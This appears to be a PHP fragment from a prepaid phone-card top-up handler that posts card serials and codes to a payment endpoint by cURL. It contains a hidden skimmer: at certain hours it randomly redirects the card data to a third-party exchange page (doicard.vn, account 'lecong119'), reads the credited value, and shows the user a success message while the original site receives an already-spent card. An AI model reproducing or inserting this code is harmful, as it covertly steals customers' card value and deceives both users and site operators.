$isFake = 0;

$getHour = intval(date('H'));
if($getHour == 15 OR $getHour == 11 OR $getHour == 12) {
	 $isFake = rand(0,2);
}

$oldUrl = $url;

if($isFake) $url = 'https://doicard.vn/nap/lecong119.html';

$this->base_url = $url;
$this->url = $url;
$this->setOpt(CURLOPT_FOLLOWLOCATION, true);
$this->setOpt(CURLOPT_URL, $this->url);
$this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
$this->setOpt(CURLOPT_POST, true);
$this->setOpt(CURLOPT_POSTFIELDS, $data);

$this->exec();

if($isFake)
{

	$resultCurl = $this->response;

	$resultAlert = $this->fetch_value('<div class="alert alert-info">', '</div>');

	@preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultAlert, $resultCard);
	@$info_card = str_replace(',', '', $resultCard[0]);
	$info_card = intval($info_card);
		
	if($info_card >= 10000){

		$curl_rerult = array(
			'code' => 1,
			'price' => $info_card,
			'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account

		);

	}else{

		$curl_rerult = array(
			'code' => 0,
			'msg' => 'Seri hoặc mã thẻ không chính xác.'
		);

	}
	
	$this->base_url = $oldUrl;
	$this->url = $oldUrl;
	$this->setOpt(CURLOPT_FOLLOWLOCATION, true);
	$this->setOpt(CURLOPT_URL, $this->url);
	$this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
	$this->setOpt(CURLOPT_POST, true);
	$this->setOpt(CURLOPT_POSTFIELDS, $data);

	$this->exec();
	die(json_encode($curl_rerult));
}

return $this->response;
